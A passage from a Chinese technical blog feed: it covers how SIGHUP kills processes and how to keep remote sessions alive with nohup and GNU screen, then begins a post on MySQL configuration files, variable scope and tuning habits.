class="variable">$LOGFILE</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$@</span>          <span class="comment">#依次处理剩余的参数</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Processing <span class="variable">$file</span>"</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>linux 技巧：使用 screen 管理你的远程会话</title>
    <link href="https://jiemin.wang/2019/04/02/linux-screen/"/>
    <id>https://jiemin.wang/2019/04/02/linux-screen/</id>
    <published>2019-04-02T10:33:06.000Z</published>
    <updated>2019-04-02T11:04:10.233Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>有本事，你来顺着网线爬过来，你来咬我呀</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。</p><h4 id="元凶：SIGHUP-信号"><a href="#元凶：SIGHUP-信号" class="headerlink" title="元凶：SIGHUP 信号"></a>元凶：SIGHUP 信号</h4><p>让我们来看看为什么关掉窗口/断开连接会使得正在运行的程序死掉。</p><p>在Linux/Unix中，有这样几个概念:</p><ul><li>进程组（process group）：一个或多个进程的集合，每一个进程组有唯一一个进程组ID，即进程组长进程的ID。</li><li>会话期（session）：一个或多个进程组的集合，有唯一一个会话期首进程（session leader）。会话期ID为首进程的ID。</li><li>会话期可以有一个单独的控制终端（controlling terminal）。与控制终端连接的会话期首进程叫做控制进程（controlling process）。当前与终端交互的进程称为前台进程组。其余进程组称为后台进程组。</li></ul><p>根据POSIX.1定义:</p><ul><li>挂断信号（SIGHUP）默认的动作是终止程序。</li><li>当终端接口检测到网络连接断开，将挂断信号发送给控制进程（会话期首进程）。</li><li>如果会话期首进程终止，则该信号发送到该会话期前台进程组。</li><li>一个进程退出导致一个孤儿进程组中产生时，如果任意一个孤儿进程组进程处于STOP状态，发送SIGHUP和SIGCONT信号到该进程组中所有进程。</li></ul><p>因此当网络断开或终端窗口关闭后，控制进程收到SIGHUP信号退出，会导致该会话期内其他进程退出。</p><p>我们来看一个例子。打开两个SSH终端窗口，在其中一个运行top命令。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># top</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>在另一个终端窗口，找到top的进程ID为15371，其父进程ID为10034，即登录shell。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># ps -ef|grep top</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root         5     2  0 Apr01 ?        00:00:00 [stopper/0]</span><br><span class="line">root         8     2  0 Apr01 ?        00:00:00 [stopper/1]</span><br><span class="line">root     15371 10034  0 18:37 pts/1    00:00:00 top</span><br><span class="line">root     15380 15352  0 18:37 pts/2    00:00:00 grep --colour=auto top</span><br><span class="line">test_dbs2 ~ <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p>使用pstree命令可以更清楚地看到这个关系：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># pstree -H 15371|grep top    </span></span><br><span class="line">     |      |-sshd---sshd---bash---sudo---bash---sudo---bash---top</span><br><span class="line">test_dbs2 ~ <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>使用ps-xj命令可以看到，登录shell（PID 15371）和top在同一个会话期，shell为会话期首进程，所在进程组PGID为15371，top所在进程组PGID为9410，为前台进程组。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># ps -xj|grep 15371</span></span><br><span class="line">Warning: bad syntax, perhaps a bogus <span class="string">'-'</span>? See /usr/share/doc/procps-3.2.8/FAQ</span><br><span class="line"> 9410 10020 10020  9410 pts/1    15371 S        0   0:00 sudo bash</span><br><span class="line">10020 10021 10021  9410 pts/1    15371 S        0   0:00 bash</span><br><span class="line">10021 10033 10033  9410 pts/1    15371 S        0   0:00 sudo bash</span><br><span class="line">10033 10034 10034  9410 pts/1    15371 S        0   0:00 bash</span><br><span class="line">10034 15371 15371  9410 pts/1    15371 S+       0   0:00 top</span><br><span class="line">15352 15485 15484 15327 pts/2    15484 R+       0   0:00 grep --colour=auto 15371</span><br></pre></td></tr></tbody></table></figure><p></p><p>关闭第一个SSH窗口，在另一个窗口中可以看到top也被杀掉了。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># ps -ef|grep 15371</span></span><br><span class="line">root     15511 15352  0 18:42 pts/2    00:00:00 grep --colour=auto 15371</span><br><span class="line">test_dbs2 ~ <span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>如果我们可以忽略SIGHUP信号，关掉窗口应该就不会影响程序的运行了。nohup命令可以达到这个目的，如果程序的标准输出/标准错误是终端，nohup默认将其重定向到nohup.out文件。值得注意的是nohup命令只是使得程序忽略SIGHUP信号，还需要使用标记&把它放在后台运行。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup <<span class="built_in">command</span>> [argument…] &</span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然nohup很容易使用，但还是比较“简陋”的，对于简单的命令能够应付过来，对于复杂的需要人机交互的任务就麻烦了。</p><p>其实我们可以使用一个更为强大的实用程序screen。流行的Linux发行版（例如Red Hat Enterprise Linux ）</p><p>通常会自带screen实用程序，如果没有的话，可以从<a href="https://www.gnu.org/software/screen/" target="_blank" rel="noopener">GNU screen的官方网站</a>下载。</p><h2 id="开始使用Screen"><a href="#开始使用Screen" class="headerlink" title="开始使用Screen"></a>开始使用Screen</h2><p>简单来说，Screen是一个可以在多个进程之间多路复用一个物理终端的窗口管理器。Screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个screen窗口中就像操作一个真实的telnet/SSH连接窗口那样。在screen中创建一个新的窗口有这样几种方式：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># yum install -y screen</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># </span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen --help</span></span><br><span class="line">Use: screen [-opts] [cmd [args]]</span><br><span class="line"> or: screen -r [host.tty]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-4            Use IPv4.</span><br><span class="line">-6            Use IPv6.</span><br><span class="line">-a            Force all capabilities into each window<span class="string">'s termcap.</span></span><br><span class="line"><span class="string">-A -[r|R]     Adapt all windows to the new display width & height.</span></span><br><span class="line"><span class="string">-c file       Read configuration file instead of '</span>.screenrc<span class="string">'.</span></span><br><span class="line"><span class="string">-d (-r)       Detach the elsewhere running screen (and reattach here).</span></span><br><span class="line"><span class="string">-dmS name     Start as daemon: Screen session in detached mode.</span></span><br><span class="line"><span class="string">-D (-r)       Detach and logout remote (and reattach here).</span></span><br><span class="line"><span class="string">-D -RR        Do whatever is needed to get a screen session.</span></span><br><span class="line"><span class="string">-e xy         Change command characters.</span></span><br><span class="line"><span class="string">-f            Flow control on, -fn = off, -fa = auto.</span></span><br><span class="line"><span class="string">-h lines      Set the size of the scrollback history buffer.</span></span><br><span class="line"><span class="string">-i            Interrupt output sooner when flow control is on.</span></span><br><span class="line"><span class="string">-l            Login mode on (update /var/run/utmp), -ln = off.</span></span><br><span class="line"><span class="string">-list         or -ls. Do nothing, just list our SockDir.</span></span><br><span class="line"><span class="string">-L            Turn on output logging.</span></span><br><span class="line"><span class="string">-m            ignore $STY variable, do create a new screen session.</span></span><br><span class="line"><span class="string">-O            Choose optimal output rather than exact vt100 emulation.</span></span><br><span class="line"><span class="string">-p window     Preselect the named window if it exists.</span></span><br><span class="line"><span class="string">-q            Quiet startup. Exits with non-zero return code if unsuccessful.</span></span><br><span class="line"><span class="string">-r            Reattach to a detached screen process.</span></span><br><span class="line"><span class="string">-R            Reattach if possible, otherwise start a new session.</span></span><br><span class="line"><span class="string">-s shell      Shell to execute rather than $SHELL.</span></span><br><span class="line"><span class="string">-S sockname   Name this session <pid>.sockname instead of <pid>.<tty>.<host>.</span></span><br><span class="line"><span class="string">-t title      Set title. (window'</span>s name).</span><br><span class="line">-T term       Use term as <span class="variable">$TERM</span> <span class="keyword">for</span> windows, rather than <span class="string">"screen"</span>.</span><br><span class="line">-U            Tell screen to use UTF-8 encoding.</span><br><span class="line">-v            Print <span class="string">"Screen version 4.00.03 (FAU) 23-Oct-06"</span>.</span><br><span class="line">-wipe         Do nothing, just clean up SockDir.</span><br><span class="line">-x            Attach to a not detached screen. (Multi display mode).</span><br><span class="line">-X            Execute <cmd> as a screen <span class="built_in">command</span> <span class="keyword">in</span> the specified session.</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="直接在命令行键入screen命令"><a href="#直接在命令行键入screen命令" class="headerlink" title="直接在命令行键入screen命令"></a>直接在命令行键入screen命令</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen</span></span><br></pre></td></tr></tbody></table></figure><p>或者添加一个名称为mysqldump<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen -S mysqldump</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示：</p><p>暂时中断会话</p><p>半个小时之后回来了，找到该screen会话：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen -ls</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>重新连接会话：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># screen -r -S mysqldump</span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen -r 16582</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>看看出现什么了，太棒了，一切都在。继续干吧。</p><p>你可能注意到给screen发送命令使用了特殊的键组合C-a。这是因为我们在键盘上键入的信息是直接发送给当前screen窗口，必须用其他方式向screen窗口管理器发出命令，默认情况下，screen接收以C-a开始的命令。这种命令形式在screen中叫做键绑定（key binding），C-a叫做命令字符（command character）。</p><p>可以通过C-a ?来查看所有的键绑定，常用的键绑定有：</p><table><thead><tr><th style="text-align:center">C-a ?</th><th style="text-align:center">显示所有键绑定信息</th></tr></thead><tbody><tr><td style="text-align:center">C-a w</td><td style="text-align:center">显示所有窗口列表</td></tr><tr><td style="text-align:center">C-a C-a</td><td style="text-align:center">切换到之前显示的窗口</td></tr><tr><td style="text-align:center">C-a c</td><td style="text-align:center">创建一个新的运行shell的窗口并切换到该窗口</td></tr><tr><td style="text-align:center">C-a n</td><td style="text-align:center">切换到下一个窗口</td></tr><tr><td style="text-align:center">C-a p</td><td style="text-align:center">切换到前一个窗口(与C-a n相对)</td></tr><tr><td style="text-align:center">C-a 0..9</td><td style="text-align:center">切换到窗口0..9</td></tr><tr><td style="text-align:center">C-a a</td><td style="text-align:center">发送 C-a到当前窗口</td></tr><tr><td style="text-align:center">C-a d</td><td style="text-align:center">暂时断开screen会话</td></tr><tr><td style="text-align:center">C-a k</td><td style="text-align:center">杀掉当前窗口</td></tr><tr><td style="text-align:center">C-a [</td><td style="text-align:center">进入拷贝/回滚模式</td></tr></tbody></table><p>使用键绑定C-a ?命令可以看到, 默认的命令字符（Command key）为C-a，转义C-a（literal ^a）的字符为a：</p><p>如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test_dbs2 ~ <span class="comment"># kill -9 8462</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen -wipe</span></span><br><span class="line">test_dbs2 ~ <span class="comment"># screen -ls</span></span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化原理(三)</title>
    <link href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-3/"/>
    <id>https://jiemin.wang/2019/03/29/mysql-optimization-principle-3/</id>
    <published>2019-03-29T06:57:29.000Z</published>
    <updated>2019-03-29T08:33:32.356Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>戴上它。都几十岁的人了，你看你多贱，你没尊严啊？我不想看见你，快点戴上，然后去看医生。</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>聊聊 MySQL 配置。</p><p>大多数开发者可能不太会关注 MySQL 的配置，毕竟在基本配置没有问题的情况下，把更多的精力放在 schema 设计、索引优化和 SQL 优化上，是非常务实的策略。这时，如果再花力气去优化配置项，获得的收益通常都比较小。更多的时候，基于安全因素的考量，普通开发者很少能够接触到生产环境的 MySQL 配置。正是这样，导致开发者（包括我）对 MySQL 的配置不甚了解，希望本文能帮你更好的了解 MySQL 配置。</p><p>如果让你在某种环境上安装配置 MySQL，你会怎么做？安装后，直接 copy 修改示例配置文件，应该是大多数人的做法。但强烈建议不要怎么做，首先，示例配置文件有非常多注释掉的配置项，它可能会诱使你打开一个你并不了解的配置，而且这些注释还不一定准确。其次，MySQL 的一些配置对于现代化的硬件和工作负载来说，有点过时了。</p><p>MySQL 有非常多的配置项可以修改，但大多数情况下，你都不应该随便修改它，因为错误或者没用的配置导致的潜在风险非常大，而且还很难定位问题。确保基本配置正确，然后小心诊断问题，确认问题恰好可以通过某个配置项解决，紧接着再修改这个配置吧。</p><p>其实，创建一个好的配置，最快方法不是从学习配置项开始，也不是问哪个配置项应该怎么设置或者怎么修改开始，更不是从检查服务器行为和询问哪个配置项可以提升性能开始。最好是从理解 MySQL 内核和行为开始，然后利用这些知识来指导你配置 MySQL。</p><p>就从理解 MySQL 配置的工作原理开始吧。</p><h2 id="MySQL-配置的工作原理"><a href="#MySQL-配置的工作原理" class="headerlink" title="MySQL 配置的工作原理"></a>MySQL 配置的工作原理</h2><p>MySQL 从哪儿获得配置信息：命令行参数和配置文件。类 Unix 系统中，配置文件一般位于 /etc/my.cnf 或者 /etc/mysql/my.cnf。在启动时，可以通过命令行参数指定配置文件的位置，当然命令行中也可以指定其它参数，服务器会读取配置文件的内容，删除所有注释和换行，然后和命令行选项一起处理。</p><p>任何打算长期使用的配置项都应该写入配置文件，而不是在命令行中指定。一定要清楚的知道 MySQL 使用的配置文件位置，在修改时不能想当然，比如，修改了 /etc/my.cnf 的配置项，但 MySQL 实际并未使用这个配置文件。如果你不知道当前使用的配置文件路径，可以尝试：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> mysqld</span><br><span class="line">/usr/sbin/mysqld</span><br><span class="line">$ /usr/sbin/mysqld --verbose --<span class="built_in">help</span> |grep -A 1 <span class="string">'Default options'</span></span><br><span class="line">Default options are <span class="built_in">read</span> from the following files <span class="keyword">in</span> the given order:</span><br><span class="line">/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf</span><br></pre></td></tr></tbody></table></figure><p></p><p>一个典型的配置文件包含多个部分，每个部分的开头是一个方括号括起来的分段名称。MySQL 程序通常读取跟它同名的分段部分，比如，许多客户端程序读取[client]部分。服务器通常读取[mysqld]这一段，一定要确认配置项放在了文件正确的分段中，否则配置是不会生效的。</p><p>MySQL 每一个配置项均使用小写，单词之间用下划线或者横线隔开，虽然我们常用的分隔符是下划线，但如果在命令行或者配置文件中见到如下配置，你要知道，它们其实是等价的：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">max_connections=5000</span><br><span class="line">max-connections=5000</span><br><span class="line"><span class="comment"># 命令行</span></span><br><span class="line">/usr/sbin/mysqld --max_connections=5000</span><br><span class="line">/usr/sbin/mysqld --max-connections=5000</span><br></pre></td></tr></tbody></table></figure><p></p><p>配置项可以有多个作用域：全局作用域、会话作用域 (每个连接作用不同)、对象作用域。很多会话级配置项跟全局配置相等，可以认为是默认值，如果改变会话级配置项，它只影响改动的当前连接，当连接关闭时，所有的参数变更都会失效。下面有几个示例配置项：</p><ul><li><code>query-cache-size</code> 全局配置项</li><li><code>sort-buffer-size</code> 默认全局相同，但每个线程里也可以设置</li><li><code>join-buffer-size</code> 默认全局，且每个线程也可以设置。但若一个查询中关联多张表，可以为每个关联分配一个关联缓存 (join-buffer)，所以一个查询可能有多个关联缓冲。</li></ul><p>配置文件中的变量 (配置项) 有很多 (但不是所有) 可以在服务器运行时修改，MySQL 把这些归为动态配置变量：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-- 设置全局变量，GLOBAL和@@global作用是一样的</span><br><span class="line"><span class="built_in">set</span>   GLOBAL   sort-buffer-size  = <value></span><br><span class="line"><span class="built_in">set</span>   @@global.sort-buffer-size := <value></span><br><span class="line"></span><br><span class="line">-- 设置会话级变量，下面6种方式作用是一样的</span><br><span class="line">-- 即：没有修饰符、SESSION、LOCAL等修饰符作用是一致的</span><br><span class="line"><span class="built_in">set</span>  SESSION   sort-buffer-size  = <value></span><br><span class="line"><span class="built_in">set</span>  @@session.sort-buffer-size := <value></span><br><span class="line"><span class="built_in">set</span>          @@sort-buffer-size  = <value></span><br><span class="line"><span class="built_in">set</span>  LOCAL     sort-buffer-size  = <value></span><br><span class="line"><span class="built_in">set</span>     @@ocal.sort-buffer-size := <value></span><br><span class="line"><span class="built_in">set</span>            sort-buffer-size  = <value></span><br><span class="line"></span><br><span class="line">-- <span class="built_in">set</span>命令可以同时设置多个变量，但其中只要有一个变量设置失败，所有的变量都未生效</span><br><span class="line">SET GLOBAL sort-buffer-size = 100, SESSION sort-buffer-size = 1000;</span><br><span class="line">SET GLOBAL max-connections = 1000, sort-buffer-size = 1000000;</span><br></pre></td></tr></tbody></table></figure><p></p><p>动态的设置变量，MySQL 关闭时这些变量都会失效。如果在服务器运行时修改了变量的全局值，这个值对当前会话和其他任何已经存在的会话都不起效果，这是因为会话的变量值是在连接创建时从全局值初始化而来的。注意，在配置修改后，需要确认是否修改成功。</p><p>你可能注意到，上面的示例中，有些使用 ‘=’，有些使用 ‘:=’。对于 set 命令本身来说，两种赋值运算符没有任何区别，在命令行中使用任一运算符符，均可以生效。而在其他语句中，赋值运算符必须是 ‘:=’，因为在非 set 语句中 ‘=’ 被视为比较运算符。具体可以参考如下示例：</p><p>详细示例可以参考：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- @exp 表示用户变量，上面的示例均是系统变量</span><br><span class="line">-- 错误</span><br><span class="line"><span class="built_in">set</span> @user = 123456;</span><br><span class="line"><span class="built_in">set</span> @group = select GROUP from USER <span class="built_in">where</span> User = @user;</span><br><span class="line">select * from USER <span class="built_in">where</span> GROUP = @group;</span><br><span class="line"></span><br><span class="line">-- 正确</span><br><span class="line">SET @user := 123456;</span><br><span class="line">SELECT @group := `group` FROM user WHERE user = @user;</span><br><span class="line">SELECT * FROM user WHERE `group` = @group;</span><br></pre></td></tr></tbody></table></figure><p></p><p>有一些配置使用了不同的单位，比如table-cache变量指定表可以被缓存的数量，而不是表可以被缓存的字节数。而<code>key-buffer-size</code>则是以字节为单位。</p><p>还有一些配置可以指定后缀单位，比如1M=1024<em>1024字节，但需要注意的是，这只能在配置文件或者作为命令行参数时有效。当使用 SQL 的 SET 命令时，必须使用数字值 1048576 或者 1024</em>1024 这样的表达式，但在配置文件中不能使用表达式。</p><p><strong>小心翼翼的配置 MySQL</strong><br>我们常常动态的修改配置，但请务必小心，因为它们可能导致数据库做大量耗时的工作，从而影响数据库的整体性能。比如从缓存中刷新脏块，不同的刷新方式对 I/O 的影响差别很大 (后文会具体说明)。最好把一些好的习惯作为规范合并到工作流程中去，就比如：</p><p><strong>好习惯 1：不要通过配置项的名称来推断一个变量的作用</strong></p><p>不要通过配置项的名称来推断一个变量的作用，因为它可能跟你想象的完全不一样。比如：</p><ul><li><code>read-buffer-size</code>：当 MySQL 需要顺序读取数据时，如无法使用索引，其将进行全表扫描或者全索引扫描。这时，MySQL 按照数据的存储顺序依次读取数据块，每次读取的数据块首先会暂存在缓存中，当缓存空间被写满或者全部数据读取结束后，再将缓存中的数据返回给上层调用者，以提高效率。</li><li><code>read-rnd-buffer-size</code>：和顺序读取相对应，当 MySQL 进行非顺序读取（随机读取）数据块的时候，会利用这个缓冲区暂存读取的数据。比如：根据索引信息读取表数据、根据排序后的结果集与表进行 Join 等等。总的来说，就是当数据块的读取需要满足一定的顺序的情况下，MySQL 就需要产生随机读取，进而使用到read-rnd-buffer-size参数所设置的内存缓冲区。</li></ul><p>这两个配置都是在扫描 MyISAM 表时有效，且 MySQL 会为每个线程分配内存。对于前者，MySQL 只会在查询需要使用时才会为该缓存分配内存，并且一次性分配该参数指定大小的全部内存，而后者同样是需要时才分配内存，但只分配需要的内存大小而不是参数指定的数值，max-read-rnd-buffer-size(实际上没有这个配置项) 这个名字更能表达这个变量的实际含义。</p><p><strong>好习惯 2：不要轻易在全局修改会话级别的配置</strong></p><p>对于某些会话级别的设置，不要轻易的在全局增加它们的值，除非你确认这样做是对的。比如：<code>sort-buffer-size</code>，该参数控制排序操作的缓存大小，MySQL 只会在查询需要做排序操作时才会为该缓冲分配内存，一旦需要排序，就会一次性分配指定大小的内存，即使是非常小的排序操作。因此在配置文件中应该配置的小一些，然后在某些查询需要排序时，再在连接中把它调大。比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET @@seession.sort-buffer-size := <value></span><br><span class="line">-- 执行查询的sql</span><br><span class="line">SET @@seession.sort-buffer-size := DEFAULT -- 恢复默认值</span><br><span class="line">-- 可以将类似的代码封装在函数中方便使用。</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>好习惯 3：配置变量时，并不是值越大越好</strong><br>配置变量时，并不是值越大越好，而且如果设置的值太高，可能更容易导致内存问题。在修改完成后，应该通过监控来确认变量的修改对服务器整体性能的影响。</p><p><strong>好习惯 4：规范注释，版本控制</strong><br>在配置文件中写好注释，可能会节省自己和同事大量的工作，一个更好的习惯是把配置文件置于版本控制之下。</p><p>说完了好习惯，再来说说不好的习惯。</p><p><strong>坏习惯 1：根据一些 “比率” 来调优</strong><br>一个经典的按 “比率” 调优的经验法则是，缓存的命中率应该高于某个百分比，如果命中率过低，则应该增加缓存的大小。这是非常错误的意见，大家可以仔细思考一下：缓存的命中率跟缓存大小有必然联系吗？(分母变大，值就变大了？) 除非确实是缓存太小了。关于 MyISAM 键缓冲命中率，下文会详细说明。</p><p><strong>坏习惯 2：随便使用调优脚本</strong><br>尽量不要使用调优脚本！不同的业务场景、不同的硬件环境对 MySQL 的性能要求是不一样的。比如有些业务对数据的完整性要求较高，那么就一定要保证数据不丢失，出现故障后可恢复数据，而有些业务却对数据的完整性要求没那么高，但对性能要求更高。因此，即使是同一个变量，在这两个不同场景下，其配置的值也应该是不同的。那你还能放心的使用网上找到的脚本吗 ？</p><blockquote><p>本小节示例的几个配置项，仅用于举例说明，并不代表它们有多么重要，请根据实际应用场景配置它们。就比如<code>sort-buffer-size</code>，你真的需要 100M 内存来缓存 10 行数据？</p></blockquote><h4 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h4><p>MySQL 配置文件的格式为集中式，通常会分成好几部分，可以为多个程序提供配置，如<code>[client]</code>、<code>[mysqld]</code>、<code>[mysql]</code>等等。MySQL 程序通常是读取与它同名的分段部分。</p><ul><li><code>[client]</code>客户端默认设置内容</li><li><code>[mysql]</code>使用 mysql 命令登录 MySQL 数据库时的默认设置</li><li><code>[mysqld]</code>数据库本身的默认设置</li></ul><p>例如服务器 mysqld 通常读取<code>[mysqld]</code>分段下的相关配置项。如果配置项位置不正确，该配置是不会生效的。</p><h4 id="GENERAL"><a href="#GENERAL" class="headerlink" title="GENERAL"></a>GENERAL</h4><p>首先创建一个用户 mysql 来运行 mysqld 进程，请确保这个用户拥有操作数据目录的权限。设置默认端口为 3306，有时为了安全，可能会修改一下。默认选择 Innodb 存储引擎，在大多数情况下是最好的选择。但如果默认是 InnoDB，却需要使用 MyISAM 